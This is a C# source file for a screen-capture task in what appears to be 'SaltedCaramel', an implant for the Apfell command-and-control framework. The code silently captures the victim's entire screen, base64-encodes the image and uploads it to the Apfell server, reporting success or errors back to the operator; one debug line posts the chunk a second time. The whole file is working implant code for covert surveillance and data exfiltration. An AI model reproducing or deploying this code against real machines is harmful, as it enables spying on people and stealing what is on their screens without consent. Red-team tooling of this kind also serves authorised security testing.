using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

/// <summary>
/// This task will capture a screenshot and upload it to the Apfell server
/// </summary>
namespace SaltedCaramel.Tasks
{
    class ScreenCapture
    {
        internal static void Execute(SCTask task, SCImplant implant)
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Bitmap bm = new Bitmap(bounds.Width, bounds.Height);
            Graphics g = Graphics.FromImage(bm);
            g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);

            using (MemoryStream ms = new MemoryStream())
            {
                bm.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                byte[] screenshot = ms.ToArray();

                SendCapture(implant, task.id, screenshot);
            }
        }


        // Same workflow as sending a file to Apfell server, but we only use one chunk
        private static void SendCapture(SCImplant implant, string taskId, byte[] screenshot)
        {
            try // Try block for HTTP request
            {
                // Send total number of chunks to Apfell server
                // Number of chunks will always be one for screen capture task
                // Receive file ID in response
                SCTaskResp initial = new SCTaskResp("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);

                // Convert chunk to base64 blob and create our FileChunk
                FileChunk fc = new FileChunk();
                fc.chunk_num = 1;
                fc.file_id = reply.file_id;
                fc.chunk_data = Convert.ToBase64String(screenshot);

                // Send our FileChunk to Apfell server
                // Receive status in response
                SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fc), taskId);
                Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
                string postReply = implant.PostResponse(response);
                Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.PostResponse(response)}");

                // Tell the Apfell server file transfer is done
                implant.SendComplete(taskId);
            }
            catch (Exception e) // Catch exceptions from HTTP requests
            {
                // Something failed, so we need to tell the server about it
                implant.SendError(taskId, e.Message);
                Debug.WriteLine($"[!] SendCapture - ERROR: {e.Message}");
            }
        }
    }
}
